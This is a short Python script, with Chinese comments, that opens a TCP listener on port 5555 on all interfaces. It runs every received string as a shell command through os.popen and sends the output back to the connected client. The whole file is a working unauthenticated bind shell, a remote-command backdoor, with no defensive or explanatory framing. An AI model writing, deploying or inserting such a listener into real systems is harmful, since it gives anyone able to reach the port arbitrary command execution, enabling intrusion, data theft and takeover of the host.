import socket
import os

ip = ""
port = 5555  # 设置端口

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 关闭后不需要保存状态可以立即开启
s.bind((ip, port))  # 对象s 开始绑定ip和端口
s.listen(10)  # 启动监听状态，设置队列中等待连接服务器的最大请求数10

conn, addr = s.accept()

while True:
    data = conn.recv(1024)  # 接收对方字符串
    print(data)  # 打印对方发来的数据
    if data == b"exit":
        break
    data = str(data, encoding="utf8")
    f = os.popen(data)  # 返回内容
    data2 = f.read()
    if data2 == "":
        conn.send(b"No response!")
    else:
        conn.send(bytes(data2, encoding="utf8"))  # 发送命令运行结果

conn.close()  # 断开连接
s.close()
